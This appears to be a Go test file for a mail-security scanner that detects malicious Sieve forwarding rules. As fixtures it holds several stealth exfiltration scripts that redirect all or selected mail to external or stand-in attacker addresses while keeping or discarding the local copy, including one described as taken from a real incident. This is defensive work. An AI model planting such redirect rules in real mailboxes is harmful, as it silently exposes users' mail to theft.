package checks

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
)

// The dovecot/Roundcube sieve script that let aura@lifecont.ro be intercepted
// for a year: forward every message to an external dropbox while :copy keeps a
// local copy so the victim never notices. This is the active exfil path that
// the Exim-filter-only audit missed.
const sieveAuraStealth = `require ["copy"];
# rule:[Forwarding]
if true
{
	redirect :copy "frontdesk.officer04@gmail.com";
}
`

func scoreSieve(t *testing.T, content string, mb filterMailbox, localDomains map[string]bool, known []string) []filterFinding {
	t.Helper()
	rules := parseSieveFilter(content)
	return scoreFilterRules(rules, mb, localDomains, known)
}

func TestParseSieveRedirectCopyIsStealthExfil(t *testing.T) {
	mb := filterMailbox{localPart: "aura", domain: "lifecont.ro"}
	got := scoreSieve(t, sieveAuraStealth, mb, map[string]bool{"lifecont.ro": true}, nil)
	if len(got) != 1 {
		t.Fatalf("len(findings) = %d, want 1: %+v", len(got), got)
	}
	f := got[0]
	if f.check != "email_filter_exfil" || f.severity != alert.Critical {
		t.Fatalf("finding = %+v, want email_filter_exfil/Critical", f)
	}
	if f.dest != "frontdesk.officer04@gmail.com" {
		t.Errorf("dest = %q, want the external dropbox", f.dest)
	}
	if !strings.Contains(f.reason, "copies every message") {
		t.Errorf("reason = %q, want stealth-copy wording", f.reason)
	}
}

func TestParseSievePlainUnconditionalRedirectIsExfil(t *testing.T) {
	// redirect without :copy cancels the implicit keep, but forwarding ALL mail
	// externally is still a mailbox takeover, not a benign selective forward.
	body := `if true
{
	redirect "attacker@evil.example";
}
`
	mb := filterMailbox{localPart: "sales", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].check != "email_filter_exfil" || got[0].severity != alert.Critical {
		t.Fatalf("findings = %+v, want one email_filter_exfil/Critical", got)
	}
}

func TestParseSieveRestrictiveRedirectNoCopyIsForwarder(t *testing.T) {
	// A selective forward (only invoices) with no local copy is the plain
	// forwarder tier: High and newness-gated, not an inherent interception.
	body := `require ["fileinto"];
# rule:[fwd]
if header :contains "subject" "invoice"
{
	redirect "billing@partner.example";
}
`
	mb := filterMailbox{localPart: "office", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 {
		t.Fatalf("len(findings) = %d, want 1: %+v", len(got), got)
	}
	if got[0].check != "email_filter_forwarder" || got[0].severity != alert.High || !got[0].onlyIfNew {
		t.Fatalf("finding = %+v, want email_filter_forwarder/High/onlyIfNew", got[0])
	}
}

func TestParseSieveExplicitKeepIsStealthExfil(t *testing.T) {
	// redirect + explicit keep retains a local copy: stealth interception even
	// under a restrictive condition.
	body := `if header :contains "subject" "wire"
{
	redirect "drop@evil.example";
	keep;
}
`
	mb := filterMailbox{localPart: "cfo", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].check != "email_filter_exfil" || got[0].severity != alert.Critical {
		t.Fatalf("findings = %+v, want one email_filter_exfil/Critical", got)
	}
}

func TestParseSieveFileintoIsStealthExfil(t *testing.T) {
	body := `require ["fileinto"];
if header :contains "subject" "wire"
{
	redirect "drop@evil.example";
	fileinto "Archive";
}
`
	mb := filterMailbox{localPart: "cfo", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].check != "email_filter_exfil" || got[0].severity != alert.Critical {
		t.Fatalf("findings = %+v, want one email_filter_exfil/Critical", got)
	}
}

func TestParseSieveRedirectDiscardHidesLocalCopy(t *testing.T) {
	// redirect + discard forwards externally and drops the local copy: the
	// blackhole variant of interception.
	body := `if true
{
	redirect "drop@evil.example";
	discard;
}
`
	mb := filterMailbox{localPart: "aura", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].check != "email_filter_exfil" || got[0].severity != alert.Critical {
		t.Fatalf("findings = %+v, want one email_filter_exfil/Critical", got)
	}
	if !strings.Contains(got[0].reason, "discards the local copy") {
		t.Errorf("reason = %q, want discard-to-hide wording", got[0].reason)
	}
}

func TestParseSieveSameDomainRedirectIgnored(t *testing.T) {
	// contact@franchisebucharest.com -> florin@franchisebucharest.com: a legit
	// same-domain copy-forward, not an external exfil.
	body := `# rule:[Forwarding]
if true
{
	redirect :copy "florin@example.com";
}
`
	mb := filterMailbox{localPart: "contact", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 0 {
		t.Fatalf("same-domain copy-forward produced findings: %+v", got)
	}
}

func TestParseSieveIgnoresComments(t *testing.T) {
	// Block and line comments must not swallow the redirect or its :copy tag.
	body := `/* multi
line comment with redirect "decoy@evil.example"; inside */
require ["copy"]; # trailing comment
if true
{
	# inner comment
	redirect :copy "real@evil.example";
}
`
	mb := filterMailbox{localPart: "u", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].dest != "real@evil.example" {
		t.Fatalf("findings = %+v, want single finding for real@evil.example", got)
	}
}

func TestParseSieveNestedIfInheritsLocalCopy(t *testing.T) {
	// An outer keep plus an inner-branch redirect still pairs into stealth.
	body := `if header :contains "from" "boss@example.com"
{
	keep;
	if header :contains "subject" "wire"
	{
		redirect "drop@evil.example";
	}
}
`
	mb := filterMailbox{localPart: "cfo", domain: "example.com"}
	got := scoreSieve(t, body, mb, map[string]bool{"example.com": true}, nil)
	if len(got) != 1 || got[0].check != "email_filter_exfil" {
		t.Fatalf("findings = %+v, want stealth exfil from inherited keep", got)
	}
}

func TestSieveTestMatchesAll(t *testing.T) {
	tests := []struct {
		name string
		test string
		want bool
	}{
		{"true", "true", true},
		{"false", "false", false},
		{"anyof true", `anyof (true, header :contains "subject" "x")`, true},
		{"header contains at", `header :contains "from" "@"`, true},
		{"address contains at", `address :all :contains "from" "@"`, true},
		{"restrictive subject", `header :contains "subject" "invoice"`, false},
		{"negated", `not header :contains "subject" "x"`, false},
	}
	for _, tt := range tests {
		got := sieveTestMatchesAll(tokenizeSieve(tt.test))
		if got != tt.want {
			t.Errorf("sieveTestMatchesAll(%q) = %v, want %v", tt.test, got, tt.want)
		}
	}
}

func TestMailboxFromSievePath(t *testing.T) {
	tests := []struct {
		path string
		mb   filterMailbox
	}{
		{"/home/u/mail/example.com/aura/sieve/roundcube.sieve", filterMailbox{localPart: "aura", domain: "example.com"}},
		{"/home/u/mail/example.com/aura/.dovecot.sieve", filterMailbox{localPart: "aura", domain: "example.com"}},
	}
	for _, tt := range tests {
		if got := mailboxFromSievePath(tt.path); got != tt.mb {
			t.Errorf("mailboxFromSievePath(%q) = %+v, want %+v", tt.path, got, tt.mb)
		}
	}
}

// Integration: CheckMailFilters must scan sieve scripts under /home and flag
// the stealth-copy redirect as a non-gated critical exfil on first scan, the
// same way it treats an Exim deliver+save filter.
func TestCheckMailFiltersFlagsSieveStealthOnFirstScan(t *testing.T) {
	withTestStore(t)
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	sievePath := "/home/lifecontro/mail/lifecont.ro/aura/sieve/roundcube.sieve"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve") {
				return []string{sievePath}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{sievePath: now}),
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("lifecont.ro\n"), nil
			case sievePath:
				return []byte(sieveAuraStealth), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1: %+v", len(findings), findings)
	}
	f := findings[0]
	if f.Check != "email_filter_exfil" || f.Severity != alert.Critical {
		t.Fatalf("finding = %+v, want email_filter_exfil/Critical", f)
	}
	if f.Domain != "lifecont.ro" || f.Mailbox != "aura@lifecont.ro" {
		t.Errorf("tenant fields = domain %q mailbox %q, want lifecont.ro / aura@lifecont.ro", f.Domain, f.Mailbox)
	}
	if f.FilePath != sievePath {
		t.Errorf("FilePath = %q, want %q", f.FilePath, sievePath)
	}
}

// The Roundcube-managed .dovecot.sieve is a symlink to the sieve/ source that
// is already scanned; following both must not double-report the same mailbox.
func TestCheckMailFiltersSkipsSymlinkDovecotSieve(t *testing.T) {
	withTestStore(t)
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	scriptPath := "/home/lifecontro/mail/lifecont.ro/aura/sieve/roundcube.sieve"
	activePath := "/home/lifecontro/mail/lifecont.ro/aura/.dovecot.sieve"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			switch pattern {
			case filepath.Join("/home", "*", "mail", "*", "*", "sieve", "*.sieve"):
				return []string{scriptPath}, nil
			case filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve"):
				return []string{activePath}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{scriptPath: now, activePath: now}),
		lstat: func(name string) (os.FileInfo, error) {
			if name == activePath {
				return &fakeFileInfoMtime{name: ".dovecot.sieve", mode: os.ModeSymlink | 0o777, mtime: now}, nil
			}
			return &fakeFileInfoMtime{name: filepath.Base(name), mode: 0o644, mtime: now}, nil
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("lifecont.ro\n"), nil
			case scriptPath, activePath:
				return []byte(sieveAuraStealth), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1 (symlink must be de-duplicated): %+v", len(findings), findings)
	}
	if findings[0].FilePath != scriptPath {
		t.Errorf("FilePath = %q, want the real script %q", findings[0].FilePath, scriptPath)
	}
}

// A standalone .dovecot.sieve (regular file, no sieve/ source) is what an
// attacker drops directly; it must be scanned, not skipped.
func TestCheckMailFiltersScansStandaloneDovecotSieve(t *testing.T) {
	withTestStore(t)
	now := time.Date(2026, 8, 13, 12, 0, 0, 0, time.UTC)
	activePath := "/home/victim/mail/example.com/box/.dovecot.sieve"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == filepath.Join("/home", "*", "mail", "*", "*", ".dovecot.sieve") {
				return []string{activePath}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{activePath: now}),
		lstat: func(name string) (os.FileInfo, error) {
			return &fakeFileInfoMtime{name: ".dovecot.sieve", mode: 0o644, mtime: now}, nil
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/etc/localdomains":
				return []byte("example.com\n"), nil
			case activePath:
				return []byte(sieveAuraStealth), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
	if len(findings) != 1 || findings[0].Check != "email_filter_exfil" {
		t.Fatalf("standalone .dovecot.sieve not scanned: %+v", findings)
	}
}
